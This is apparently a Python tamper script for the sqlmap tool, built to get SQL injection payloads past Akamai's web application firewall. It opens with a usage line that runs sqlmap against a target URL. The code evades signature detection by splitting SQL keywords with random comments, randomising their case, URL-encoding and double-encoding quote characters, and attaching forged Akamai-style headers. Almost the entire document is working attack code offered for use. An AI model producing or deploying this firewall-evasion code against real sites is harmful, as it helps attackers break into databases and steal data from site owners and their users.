"""
SQLMap Tamper Script: akamai_bypass.py

Description:
- Designed to bypass Akamai WAF protections by:
  1. Obfuscating payloads with dynamic encoding and keyword manipulation.
  2. Adding or modifying headers to mimic legitimate Akamai-transformed traffic.
  3. Randomizing patterns to evade signature-based detection.

Usage:
sqlmap -u <target_url> --headers="X-Akamai-Transformed: 9 100 0 pmb=mNONE,1" --tamper=akamai_bypass.py
"""

import random
import string

def random_case(word):
    """Randomly change the case of characters in a string."""
    return ''.join(random.choice([c.upper(), c.lower()]) for c in word)

def obfuscate_payload(payload):
    """Apply advanced obfuscation to the payload."""
    if payload:
        # Add random comments to split keywords
        payload = payload.replace(" ", f"/*{random_string(3)}*/")

        # Randomize case of SQL keywords
        sql_keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "WHERE", "AND", "OR", "FROM"]
        for keyword in sql_keywords:
            if keyword.lower() in payload.lower():
                payload = payload.replace(keyword.lower(), random_case(keyword))

        # URL-encode special characters
        payload = payload.replace("'", "%27").replace("\"", "%22").replace("=", "%3D").replace(" ", "%20")

        # Double encode certain characters to add complexity
        payload = payload.replace("%27", "%2527").replace("%22", "%2522")

        return payload
    return payload

def random_string(length):
    """Generate a random string of fixed length."""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def tamper(payload, **kwargs):
    """Tamper with the given payload."""
    if payload:
        # Apply payload obfuscation
        payload = obfuscate_payload(payload)

        # Append fake headers (mimics Akamai WAF traffic transformations)
        akamai_headers = [
            "X-Akamai-Transformed: 9 100 0 pmb=mNONE,1",
            f"Server-Timing: ak_p; desc=\"{random_string(16)}_{random.randint(1000, 9999)}_{random.randint(1000, 9999)}\";dur={random.randint(1, 10)}"
        ]
        payload += f" --headers '{'; '.join(akamai_headers)}'"

    return payload
